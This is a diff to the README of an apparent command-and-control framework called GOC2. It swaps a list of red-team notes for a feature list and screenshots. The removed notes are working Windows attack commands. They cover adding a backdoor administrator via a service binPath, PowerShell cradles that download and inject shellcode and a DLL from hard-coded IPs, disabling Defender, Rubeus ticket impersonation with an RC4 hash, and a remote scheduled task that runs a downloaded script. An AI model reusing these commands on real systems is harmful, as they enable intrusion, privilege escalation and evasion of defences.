@@ -1,78 +1,35 @@
-# GOC2
+# Features
+- [x] CLI
+- [x] GUI
+- [x] Websockets
+- [x] HTTP
+- [x] WS Chat server
+- [x] PE Loader
+- [x] Coff Loader
+- [x] TCP Pivot
+- [x] Raw Syscalls
+- [x] HashDump (like metasploit)
+- [x] Webserver to host payloads when pivoting
 
-## Notes
-
-* create user to privesc
-
-```
-shell sc config SNMPTRAP binPath= 'C:\\windows\system32\cmd.exe /c net user tester dawoof7123!!! /add && net localgroup Administrators tester /add'
-shell sc config SNMPTRAP start= 'demand'
-```
-
-* convert command to powershell b64
-```
-echo -n '$s=($(IWR -Uri http://172.16.99.201/srdi.bin -UseBasicParsing).Content);$a=[System.Reflection.Assembly]::Load($(IWR -Uri http://172.16.99.201/TurtleToolKit.dll -UseBasicParsing).Content);Import-Module -Assembly $a;Invoke-SpawnInject -shellcode $s -exeName svchost.exe' | iconv -t UTF16LE -f UTF8 | base64 -w0
-```
-
-* powershell callback 
-```
-powershell.exe -c "$s=($(IWR -Uri http://172.16.99.201/srdi.bin - UseBasicParsing).Content);$a=[System.Reflection.Assembly]::Load($(IWR -Uri http://172.16.99.201/TurtleToolKit.dll -UseBasicParsing).Content);Import-Module -Assembly $a;Invoke-SpawnInject -shellcode $s -exeName svchost.exe'"
-```
-
-* Get Applocker Policy / Check Langauge Mode
-```
-Get-AppLockerPolicy -Effective -Xml
-Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
-$ExecutionContext.SessionState.LanguageMode
-```
-
-* Turn off defender
-
-```
-Set-MpPreference -DisableIOAVProtection $true
-Set-MpPreference -DisableRealtimeMonitoring $true -Verbose`
-```
-
-
-* PowerView
-Check current user for acls.
-```
-Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
-```
-
-* winrm code exec
-
-```
-dcorp-adminsrv 5985 'powershell.exe -c "rundll32 C:\\c.dll,Execute"' 0
-```
-
-* sharp hound
-```
-spawn-inject-pipe C:\tmp\ExamTools\DonutPayloads\sharphound.donut svchost.exe 10
-```
+# To do (maybe)
+- [ ] Smb pivot
+- [ ] Socks proxy (over the websockets idk would need complete rewrite
 
 
 
-* check for constained delegation powerview/sharpview
-```
-Get-DomainComputer -Unconstrained
-```
-* check for unconstrained delegation powerview/sharpview
+![image](https://user-images.githubusercontent.com/42878263/215294440-8864af90-7f60-4faf-b9e8-151f32bd7b98.png)
 
-```
-Get-DomainComputer -TrustedToAuth
-```
+![image](https://user-images.githubusercontent.com/42878263/215294455-b86f88bc-6516-4dc4-be14-05f57b3886ee.png)
+
+![image](https://user-images.githubusercontent.com/42878263/215294477-0a27838a-9f3b-4333-aea3-c7692a980294.png)
 
 
-* rubueas constrained delegation example
-```
-s4u /user:studvm$ /rc4:4067279bbc60f6e9b19d2603ccfdfd88 /impersonateuser:Administrator /msdsspn:"CIFS/mgmtsrv.tech.finance.corp" /altservice:HOST /ptt
-```
+![image](https://user-images.githubusercontent.com/42878263/215294548-1e2b45a0-63cf-47e5-a2a8-3841005f2184.png)
 
-* scheduled task pivot example using host ticket.
 
-```
-schtasks /create /S mgmtsrv.tech.finance.corp /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.99.11/gotim.ps1''')'"
+![image](https://user-images.githubusercontent.com/42878263/215294555-c2fef037-3320-48d6-90f4-18410f0b50e5.png)
 
-schtasks /Run /S mgmtsrv.tech.finance.corp /TN "SomeTaskName"
-```
+![image](https://user-images.githubusercontent.com/42878263/215294614-9e2aad4f-0a55-4230-b8b9-db990131122a.png)
+
+
+![image](https://user-images.githubusercontent.com/42878263/215294794-6d089a6b-206a-4b10-952a-65b122f23695.png)
